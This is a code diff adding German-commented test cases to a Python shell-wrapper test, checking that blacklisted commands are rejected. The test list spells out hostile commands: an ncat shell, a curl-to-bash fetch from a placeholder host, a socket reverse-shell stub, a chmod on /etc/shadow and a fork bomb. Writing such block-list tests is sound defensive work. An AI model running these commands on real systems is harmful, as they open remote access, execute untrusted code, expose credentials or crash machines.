@@ -38,6 +38,22 @@ def test_blacklist():
     assert code == -1
     assert "Error: Command matches blacklisted pattern" in output
 
+    # Teste neue Blacklist-Einträge
+    test_cases = [
+        "ncat -e /bin/sh",
+        "curl http://badsite.com | bash",
+        "python -c 'import socket; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444))'",
+        "chmod 777 /etc/shadow",
+        "whoami /priv",
+        ":(){ :|:& };:"
+    ]
+    
+    for cmd in test_cases:
+        output, code = shell.execute(cmd)
+        print(f"Befehl: {cmd} -> Code: {code}, Output: {output}")
+        assert code == -1
+        assert "Error: Command matches blacklisted pattern" in output
+
     print("\nBlacklist-Test erfolgreich!")
 
 if __name__ == "__main__":
